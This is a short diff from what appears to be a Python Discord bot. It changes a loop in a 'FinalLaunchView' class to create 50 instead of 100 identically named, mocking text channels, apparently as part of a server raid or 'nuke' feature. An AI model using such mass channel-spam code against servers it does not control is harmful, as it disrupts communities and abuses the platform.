@@ -20107,7 +20107,7 @@ class FinalLaunchView(discord.ui.View):
         channel_name = "😂-chal-ab-baith-ke-tuntuna-baja🍌"
         
         # 50 Channels Create Karo
-        for i in range(100):
+        for i in range(50):
             # create_text_channel coroutine return karta hai, task banao
             task = guild.create_text_channel(channel_name)
             create_tasks.append(task)
